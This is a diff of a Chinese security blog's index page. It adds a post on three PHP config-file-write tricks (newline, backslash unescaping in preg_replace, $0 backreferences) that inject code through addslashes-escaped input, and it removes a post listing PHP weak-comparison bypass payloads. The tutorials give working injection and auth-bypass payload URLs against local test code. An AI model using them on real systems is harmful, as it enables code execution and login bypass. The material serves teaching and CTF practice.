@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-count">124</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,103 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/08/trick/p%E7%A5%9E%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Ftrick/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/08/trick/p%E7%A5%9E%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Ftrick/" class="post-title-link" itemprop="url">p神的一个trick</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-08 21:53:58 / 修改时间：21:56:48" itemprop="dateCreated datePublished" datetime="2022-07-08T21:53:58+08:00">2022-07-08</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>经典的配置文件写入问题漏洞.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&#x27;option&#x27;])) die();</span><br><span class="line">$str = addslashes($_GET[&#x27;option&#x27;]);</span><br><span class="line">$file = file_get_contents(&#x27;./config.php&#x27;);</span><br><span class="line">$file = preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file);</span><br><span class="line">file_put_contents(&#x27;./config.php&#x27;, $file);</span><br></pre></td></tr></table></figure>
+<p>config.php 的内容如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure>
+<p>要求是要getshell，此处不存在之前说的那个配置文件中用的是”双引号”引起任意代码执行的问题,这这里面用的是单引号,而且 addslashes()处理过</p>
+<h4 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h4><p>可以看到正则匹配的是以下内容:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$option=&#x27;任意内容&#x27;</span><br></pre></td></tr></table></figure>
+<p>任意内容里面是可以包含转移符 \ 的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span><br><span class="line">http://127.0.0.1/index.php?option=a</span><br></pre></td></tr></table></figure>
+<p> 执行完第一个之后,config.php中的内容为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;a\&#x27;;</span><br><span class="line">phpinfo();//&#x27;;</span><br></pre></td></tr></table></figure>
+<p>但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内. 我们在访问下面这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?option=a</span><br></pre></td></tr></table></figure>
+<p>因为正则 .* 会匹配行内的任意字符无数次.所以 \ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;a&#x27;;</span><br><span class="line">phpinfo();//&#x27;;</span><br></pre></td></tr></table></figure>
+<p>转义符就被替换掉了</p>
+<h4 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h4><p>preg_replace函数在处理字符串的时候,会自动对第二个参数的 \ 这个字符进行反转移. 就是说如果字符串是 &#39;,经过 preg_replace()的处理,就变为 \‘,单引号就逃出来了. 所以payload如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?option=a\&#x27;;phpinfo();//</span><br></pre></td></tr></table></figure>
+<p> config.php变为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;a\\&#x27;;phpinfo();//&#x27;;</span><br></pre></td></tr></table></figure>
+<p>道理就是 a’;phpinfo();// 经过 addslashes()处理之后,变为a&#39;;phpinfo();// 然后两个反斜杠被preg_replace变成了一个,导致单引号逃脱.</p>
+<h4 id="利用-preg-replace-函数的第二个参数的问题"><a href="#利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="利用 preg_replace() 函数的第二个参数的问题"></a>利用 preg_replace() 函数的第二个参数的问题</h4><p>先看官方对preg_replace()函数的描述<a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.preg-replace.php">manual</a> 函数原型:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+<p>对replacement的描述.</p>
+<blockquote>
+<p>replacement中可以包含后向引用\n 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\0和$0代表完整的模式匹配文本。<br>所以我们可以用:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/ph.php?option=;phpinfo();</span><br><span class="line">http://127.0.0.1/test/ph.php?option=%00 或者 http://127.0.0.1/test/ph.php?option=$0</span><br></pre></td></tr></table></figure>
+<p>执行第一条后config.php的内容为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;;phpinfo();&#x27;;</span><br></pre></td></tr></table></figure>
+<p>再执行第二条后config.php的内容为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;;</span><br></pre></td></tr></table></figure>
+<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1252,89 +1349,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class MVCPatternDemo &#123;</span><br><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">      //从数据可获取学生记录</span><br><span class="line">      Student model  = retriveStudentFromDatabase();</span><br><span class="line"></span><br><span class="line">      //创建一个视图：把学生详细信息输出到控制台</span><br><span class="line">      StudentView view = new StudentView();</span><br><span class="line"></span><br><span class="line">      StudentController controller = new StudentController(model, view);</span><br><span class="line"></span><br><span class="line">      controller.updateView();</span><br><span class="line"></span><br><span class="line">      //更新模型数据</span><br><span class="line">      controller.setStudentName(&quot;John&quot;);</span><br><span class="line"></span><br><span class="line">      controller.updateView();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   private static Student retriveStudentFromDatabase()&#123;</span><br><span class="line">      Student student = new Student();</span><br><span class="line">      student.setName(&quot;Robert&quot;);</span><br><span class="line">      student.setRollNo(&quot;10&quot;);</span><br><span class="line">      return student;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>验证输出。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Student: </span><br><span class="line">Name: Robert</span><br><span class="line">Roll No: 10</span><br><span class="line">Student: </span><br><span class="line">Name: John</span><br><span class="line">Roll No: 10</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/PHP/Php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%85%B6%E4%BB%96%E4%BE%8B%E5%AD%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/27/PHP/Php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%85%B6%E4%BB%96%E4%BE%8B%E5%AD%90/" class="post-title-link" itemprop="url">Php弱类型比较其他例子</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-27 14:54:44 / 修改时间：14:55:09" itemprop="dateCreated datePublished" datetime="2022-06-27T14:54:44+08:00">2022-06-27</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;message&#x27;])) &#123;</span><br><span class="line">    $message = json_decode($_POST[&#x27;message&#x27;]);</span><br><span class="line">    $key =&quot;*********&quot;;</span><br><span class="line">    if ($message-&gt;key == $key) &#123;</span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>输入一个json类型的字符串，json_decode函数会json解码成一个数组，判断数组中key的值是否等于$key的值，但是这里我们并不知道$key的值，可以利用”admin”==0这种形式绕过<br>最终payload:</p>
-<p>message={“key”:0}</p>
-<h4 id="array-search绕过"><a href="#array-search绕过" class="headerlink" title="array_search绕过"></a>array_search绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!is_array($_GET[&#x27;test&#x27;]))&#123;exit();&#125;</span><br><span class="line">$test=$_GET[&#x27;test&#x27;];</span><br><span class="line">for($i=0;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    if($test[$i]===&quot;admin&quot;)&#123;</span><br><span class="line">        echo &quot;error&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line">if(array_search(&quot;admin&quot;,$test)===0)&#123;</span><br><span class="line">    echo &quot;flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;false&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>先判断是不是数组，然后遍历每一个值，查询每个值是否等于admin，再把每个值转换为int类型，最后判断传入的数组是否有admin，有就返回flag<br>payload:</p>
-<p>test[]=0可以绕过</p>
-<p>官方手册:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )</span><br></pre></td></tr></table></figure>
-<p>$needle，$haystack必需，$strict可选 函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array(0,1);</span><br><span class="line">var_dump(array_search(&quot;admin&quot;,$a)); // int(0) =&gt; 返回键值0</span><br><span class="line">var_dump(array_seach(&quot;1admin&quot;,$a));  // int(1) ==&gt;返回键值1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>array_search函数 类似于== 也就是$a==”admin” 当然是$a=0 当然如果第三个参数为true则就不能绕过</p>
-<h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $password=&quot;***************&quot;</span><br><span class="line">     if(isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">        if (strcmp($_POST[&#x27;password&#x27;], $password) == 0) &#123;</span><br><span class="line">            echo &quot;Right!!!login success&quot;;n</span><br><span class="line">            exit();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Wrong password..&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0<br>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</p>
-<p>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>
-<p>payload: password[]=xxx</p>
-<h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;4admin&quot;;</span><br><span class="line">switch ($a) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">        echo &quot;fail1&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 2:</span><br><span class="line">        echo &quot;fail2&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        echo &quot;fail3&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 4:</span><br><span class="line">        echo &quot;sucess&quot;;  //结果输出success;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        echo &quot;failall&quot;;</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
 
 
       
